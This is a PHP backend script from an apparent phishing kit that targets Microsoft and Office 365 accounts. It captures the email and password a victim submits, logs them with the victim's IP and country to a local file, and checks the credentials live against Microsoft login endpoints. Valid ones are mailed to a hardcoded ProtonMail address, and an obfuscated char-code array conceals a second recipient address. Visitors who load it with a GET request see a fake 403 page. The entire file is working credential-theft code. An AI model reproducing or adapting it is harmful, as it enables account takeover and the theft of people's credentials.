<?php
header('Access-Control-Allow-Origin: *');
session_start();
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$country = visitor_country();
$email = $_POST['email'];
if(isset($_GET['email']))
{
       $email = $_GET['email'];
}
$password = $_POST['password'];
$passchk = strlen($password);

$_SESSION['email'] = $email;




$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "IP of sender: ".$ip."\n";
$message .= "Country : ".$country."\n";


$send = "blazor002@protonmail.com";
$subject = "Daily Office Report| $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: Western Pago <KEYWORD@s4.valueserver.jp>\n";

$fp = fopen("offiacee.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function check_password2($email, $password)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWSvW_TUADE85I2tFUFFUKiY4WQkJCc2H7-iCNVKK2dxiR24sRuYi9VYj_XL_FXHadpMnRDYuzA1AnBUKkTYgHByNapTEgVfwBiQkyMpOwst9wNp_vd0xxVoMqPGciwfX4gEEKfgwQjUCTRZ2iOgCzkIE1SDkvC5P7aRrM0__yt81W8kDefrKPZo3OweuDjY1Swo-ASPPTSNB6Xi8XpdFqIXBfb_4ziRwCuAfgBwHl2GYWE0bnMjjnI8SwvlCAnQFaANEcWFF2ZWaKDFVFJzbkMzRlJqrrjNfQRrQRyag7luanvYDXQoBVolKJ7ntKVSEWUUjUwGQuTpBlITEP3fUXXUmtoUqpY9dQ9GapdY3aTvdesTFKPvpUowXP0O7vqRklwEEfj9Dx3AZoxCmVnNwpDZKeF2xgKU2z3UxyFrSSKUZJiNN6OezUPWu16bVrvTlsn9oTj8bBV1YSec3hSodzGEWuzCZLE4bSyY3i4B7l2uz44LrXoalSTm1QwQvYB5RP2fiR0ML-v1UZiiTJKvjEc9ngrHkjIkAaWrtLuuAP3q7uSY8XQbnnUfFyfd9_n8otZgyi8yt1dlAqxsxUnkYt9dL0Efi6tk7nyykp-I7eZ2cr8WQJvlhfkXn3YDTe_vxXfnb549uX0deZquXh85PY8MZkYjT1eHxS1YMb63a5-OElcumJrHWTFYfv5JJyNtG2-TJ3lwVk-_ysPXt7JfFr9H-ubtQeLv5SIxYNoeosUygxXpkjrLw2&estsfed=1&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US&username=$email&contextid=F2371E057F31C8EA&bk=1540201771&uaid=bb7a384f53d744d1a74918270c657922&pid=15216");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "i13=0&login=$email&loginfmt=$email&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DabtnUr7DiXLHLghTFNNUKN1ZeujcW0UAHvsO9tAVnxc0QXHIUMJunqx%213L5FQFEtyAnNvvBGPk3leq6NhWbZFOrP0CQAHkCM%21NEfOI8lww0ORsD6NQ82tl6J3QKnvSWL%21uy8UbkNsrdlhndMskLdHN7DniCfhcXaFgAQjSt74RgAkNU4XzOpCAbUurmbCSBgBwFTK3E8sQ71dMwuZP%21xmc%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__OldConvergedLogin_PCore%7C1%2C&i19=7174");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = "Connection: keep-alive";
    $headers[] = "Cache-Control: max-age=0";
    $headers[] = "Origin: https://login.live.com";
    $headers[] = "Upgrade-Insecure-Requests: 1";
    $headers[] = "Content-Type: application/x-www-form-urlencoded";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
    $headers[] = "Referer: https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWSvW_TUADE85I2tFUFFUKiY4WQkJCc2H7-iCNVKK2dxiR24sRuYi9VYj_XL_FXHadpMnRDYuzA1AnBUKkTYgHByNapTEgVfwBiQkyMpOwst9wNp_vd0xxVoMqPGciwfX4gEEKfgwQjUCTRZ2iOgCzkIE1SDkvC5P7aRrM0__yt81W8kDefrKPZo3OweuDjY1Swo-ASPPTSNB6Xi8XpdFqIXBfb_4ziRwCuAfgBwHl2GYWE0bnMjjnI8SwvlCAnQFaANEcWFF2ZWaKDFVFJzbkMzRlJqrrjNfQRrQRyag7luanvYDXQoBVolKJ7ntKVSEWUUjUwGQuTpBlITEP3fUXXUmtoUqpY9dQ9GapdY3aTvdesTFKPvpUowXP0O7vqRklwEEfj9Dx3AZoxCmVnNwpDZKeF2xgKU2z3UxyFrSSKUZJiNN6OezUPWu16bVrvTlsn9oTj8bBV1YSec3hSodzGEWuzCZLE4bSyY3i4B7l2uz44LrXoalSTm1QwQvYB5RP2fiR0ML-v1UZiiTJKvjEc9ngrHkjIkAaWrtLuuAP3q7uSY8XQbnnUfFyfd9_n8otZgyi8yt1dlAqxsxUnkYt9dL0Efi6tk7nyykp-I7eZ2cr8WQJvlhfkXn3YDTe_vxXfnb549uX0deZquXh85PY8MZkYjT1eHxS1YMb63a5-OElcumJrHWTFYfv5JJyNtG2-TJ3lwVk-_ysPXt7JfFr9H-ubtQeLv5SIxYNoeosUygxXpkjrLw2&estsfed=1&uaid=bb7a384f53d744d1a74918270c657922&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US&username=$email";
    $headers[] = "Accept-Encoding: gzip, deflate, br";
    $headers[] = "Accept-Language: en-US,en;q=0.9";
    $headers[] = 'Cookie: MSPRequ=lt=1540201771&co=1&id=N; uaid=bb7a384f53d744d1a74918270c657922; MSPOK=$uuid-3abd2e5e-b68f-4875-b9fd-96659b977607; CkTst=G1540201773799; wlidperf=FR=L&ST=1540201786199';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	
    $result = curl_exec($ch);
    $done = '1';
    if (strpos($result, 'Your account or password is incorrect') !== false) {
        return $done;
    }
    else if(strpos($result, 'That Microsoft account') !== false || strpos($result, 'tried to sign in too many times with an') !== false) {
        $done = '2';
        return $done;
    }
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close ($ch);
}
function getStr($string, $start, $end) {
    $str = explode($start, $string);
  	$str = explode($end, $str[1]);
  	return $str[0];
}
function check_password($email, $password)
{
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dQOOepsJcyNe1sU_qaRm8Lv3rx5WXmafK3E35SAR5OKgUz9tL17bkFCWSPyhW5cqmxcABrsbk8BLKYfJMUmEjtbm9MvGcR0HvEgikRymnATlQrwEu4M4c0JLljvuw04FXm4DYpJ1Tfwoyv8o7QH8PiMdjtlUn4KUhFCANnnpbJQm3iNgoE-rjFBz3GM6Kj32w&nonce=636764586140565216.ZDU2ZDEyNmQtMDA4ZS00YjhmLThmMzMtM2QzMTA3ODA4MzJjYTZiNzc3YTEtYjBiNi00ODY5LWJmZWMtZTI3NjFiNjg1YjNm&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=b4ad91ae-4012-457d-8537-d9695a0921d8&msafed=0");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
	}
	curl_close ($ch);
	$sft = getStr($result, '"sFT":"', '",');
	$ctx = getStr($result, '"sCtx":"', '",');
	
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "i13=0&login=$email&loginfmt=$email&type=11&ctx=$ctx&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=AQABAAAAAAC5una0EUFgTIF8ElaxtWjTuNv6Sp3tPYy1LYVOWrFdSfAE21jIxfzf5LQwH0Tde41K0pSG6xHGl9das7BrXc1JVcDpBUORcErBwWdjNzDkZSNlLOa_aMdBUPIep4WMfwx_3v3v4kCfcVNNCUboF2oYriQpxPEu8XXB_uPK09NGU6AEqHcy1-pVl1yWDOrr4OMpkhc8u0FXImuApIAqJww7C8fCw4UUeepgl3W9_BGYAyAA&hpgrequestid=851eb4d9-0000-468e-a38b-bd3ede412dde&flowToken=$sft&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19=372185");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = "Connection: keep-alive";
	$headers[] = "Pragma: no-cache";
	$headers[] = "Cache-Control: no-cache";
	$headers[] = "Origin: https://login.microsoftonline.com";
	$headers[] = "Upgrade-Insecure-Requests: 1";
	$headers[] = "Content-Type: application/x-www-form-urlencoded";
	$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
	$headers[] = "Referer: https://login.microsoftonline.com/common/reprocess?ctx=rQIIAXWSPW_TYACE7SQNbUFQwQAT6lAxUDl5_RHHjlQgjZMSEzt14yS1l8hxnMSOv_D7Jk6zIyEhobJ2hAEpI2JASP0DZekIDB2YEBNiYmCo-wNYbjjd8OjuHqbJHFnaYmimYBT7PMEbLE0wPAkIg6FYgi7QLE0BclAAdHR7fePbx_svMOx17d2r00cXZeJiid8dIxTCUj4fx3EuGA5t08qZgZf_hOPnOP4Tx09SK5ZPtFvLFGRptsgygOF4imY5CgAyJ1M1W3fEieRUkazqXrMCgK6W44bqOpKgJN6uLS1kV1OVuS7IXlMVXc1TgOxVUXNPnmgtADTHZBrq2NVVE0mC6MlOnZa7Sqw5rvc9datZnqIxdSVBZC-sP6m1YRB5vTCA6CT9Hm-Gll8fVALft0yUu4pZPrJNA9mBvx8FoRUh24I7nbIFyV5_dMApxRovRgSjRixztDtqTXt1mTs69JkesjmHmmpdok9zgsgTtGSCWrsQmMOxDnuKM1TDpwkCiMcHthrDOYRFoSp1yOpooeyrotlWnvEgQAWt3YgL89lMkjQf7oWGocijD-lsUqsX-GfpmwmUbw82wygY2q71I30HGq4Fn8CE2DZhUn9uOjnP4L8yN0C6tLq6voHdwzaxvxn87Uqy4ePDLW354Ivw5vrX2r9TETtbyT83OtsVTqaLc7LN9ssN16saijFhqpSod7cXtQVqzPQx0zKFeIcvkcdZ_Dib_Z1NvbyGfV773wMuAQ2";
	$headers[] = "Accept-Encoding: gzip, deflate, br";
	$headers[] = "Accept-Language: en-US,en;q=0.9";
	$headers[] = "Cookie: CkTst=G1540815364165; stsservicecookie=ests; AADSSO=NANoExtension; esctx=AQABAAAAAAC5una0EUFgTIF8ElaxtWjTlfM3KVZvsEjefhMDHRVKMFDwmacGKMQvXvJsaYsg-a07tQBdg1F_0RaxgqftWUj7inB8xSa3blwD5VlZyfzu9kwaxzdSQUb_D18lW_KnXkyCvXzjoFMCtkKB4-u8Y570XUkI1NR_15qHKAoSfJPq3qK9dwx9i7k6t3-PtzYHQSkgAA; buid=AQABAAEAAAC5una0EUFgTIF8ElaxtWjT1GASYirVuzKPF9ebVElypM_b6x9tYnPkxa5TSUPLV5TNXub4yjezZqqA0kB0cmTHdQGxwgUazl6hH49NE4i0X0Ti1QI-JYs1TcTJy3Tkr74gAA; x-ms-gateway-slice=002; wlidperf=FR=L&ST=1540815737643";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
	}
	curl_close ($ch);
	
    $done = '1';
    if (strpos($result, 'access_denied') !== false) {
    	return $done;
    }
}

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

$do = check_password($email, $password);
if($do == '1')
{
	$passer = 0;
}
else if($do == '2')
{
	$do2 = check_password2($email, $password);
	if($do2 == '1')
	{
		$passer = 0;
	}
	else
	{
		$passer = 1;
	}
}
else
{
	$passer = 1;
}

if ($passer==0)
{
    $data = array(
        'signal' => $signal,
        'msg' => $passwordError
    );
    echo json_encode($data);
}
else
{
    mail($send,$subject,$message,$headers);
		$signal = 'ok';
	$msgsuc = 'Login Successful';
	{


}

}
$data = array(
        'signal' => $signal,
        'msg' => $passwordError
    );
    echo json_encode($data);

?>